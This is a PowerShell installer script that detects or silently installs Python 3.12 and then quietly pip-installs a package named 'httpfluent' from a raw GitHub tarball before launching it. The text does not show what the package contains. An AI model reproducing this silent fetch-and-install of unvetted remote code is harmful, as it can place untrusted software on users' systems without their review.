# =====================================================
# Python 3.12 + httpfluent (Production-ready, controllable)
# =====================================================

# -----------------------------
# CONFIG: Toggle behavior
# $true  = always force install Python 3.12
# $false = use existing Python >=3.9 if available
$ForcePythonInstall = $false

# -----------------------------
# Disable PowerShell progress
# -----------------------------
$ProgressPreference = 'SilentlyContinue'

Write-Host "[*] Starting script..." -ForegroundColor Cyan

# -----------------------------
# Step 0: Detect existing Python >=3.9
# -----------------------------
$BestPython = $null
$Candidates = @()

# Check Python in PATH
$cmd = Get-Command python -ErrorAction SilentlyContinue
if ($cmd) { $Candidates += $cmd.Source }

# Check common install directories
$Roots = @(
    "$env:LOCALAPPDATA\Programs\Python",
    "$env:ProgramFiles\Python",
    "$env:ProgramFiles(x86)\Python"
)
foreach ($root in $Roots) {
    if (Test-Path $root) {
        Get-ChildItem -Path $root -Directory -ErrorAction SilentlyContinue | ForEach-Object {
            $exe = Join-Path $_.FullName "python.exe"
            if (Test-Path $exe) { $Candidates += $exe }
        }
    }
}

# Pick the highest Python >=3.9
foreach ($candidate in ($Candidates | Select-Object -Unique)) {
    try {
        $out = & $candidate --version 2>&1
        if ($out -match "Python (\d+\.\d+\.\d+)") {
            $ver = [version]$Matches[1]
            if ($ver -ge [version]"3.9") {
                $BestPython = $candidate
                break
            }
        }
    } catch {}
}

# -----------------------------
# Step 1: Prepare per-user Python path
# -----------------------------
$PythonRoot = "$env:LOCALAPPDATA\Programs\Python\Python312-Test"
$PythonExe = Join-Path $PythonRoot "python.exe"

# -----------------------------
# Step 2: Install Python if forced or missing
# -----------------------------
if ($ForcePythonInstall -or -not $BestPython -or -not (Test-Path $BestPython)) {

    Write-Host "[!] Installing Python 3.12.6 (per-user)..." -ForegroundColor Yellow

    $Installer = "$env:TEMP\python-3.12.6-installer.exe"

    (New-Object System.Net.WebClient).DownloadFile(
        "https://www.python.org/ftp/python/3.12.6/python-3.12.6-amd64.exe",
        $Installer
    )

    Start-Process -FilePath $Installer `
        -ArgumentList "/quiet InstallAllUsers=0 PrependPath=0 TargetDir=`"$PythonRoot`"" `
        -Wait -WindowStyle Hidden

    if (-not (Test-Path $PythonExe)) {
        Write-Host "[-] Python installation failed." -ForegroundColor Red
        exit 1
    }

    $BestPython = $PythonExe
    Write-Host "[+] Python installed successfully." -ForegroundColor Green
} else {
    Write-Host "[+] Using existing Python: $BestPython" -ForegroundColor Green
}

# -----------------------------
# Step 3: Upgrade pip silently
# -----------------------------
& $BestPython -m ensurepip | Out-Null
& $BestPython -m pip install --upgrade pip --quiet --no-input --progress-bar off

# -----------------------------
# Step 4: Install httpfluent and dependencies silently
# -----------------------------
& $BestPython -m pip install requests --quiet --no-input --progress-bar off
& $BestPython -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" --quiet --no-input --progress-bar off

# -----------------------------
# Step 5: Resolve Scripts directory
# -----------------------------
$ScriptsDir = & $BestPython -c "import sysconfig;print(sysconfig.get_path('scripts'))"
$ScriptsDir = $ScriptsDir.Trim()
$HttpFluentExe = Join-Path $ScriptsDir "httpfluent.exe"

Write-Host "[+] Scripts directory: $ScriptsDir" -ForegroundColor Green

# -----------------------------
# Step 6: Launch httpfluent visibly
# -----------------------------
if (Test-Path $HttpFluentExe) {
    Write-Host "[+] Launching httpfluent --help" -ForegroundColor Green
    try {
        $WshShell = New-Object -ComObject WScript.Shell
        $WshShell.Run("`"$HttpFluentExe`" --help", 1, $false)
    } catch {
        Start-Process -FilePath $HttpFluentExe -ArgumentList "--help" -WindowStyle Normal
    }
} else {
    Write-Host "[-] httpfluent.exe not found." -ForegroundColor Red
}

Write-Host "[*] Script finished." -ForegroundColor Cyan
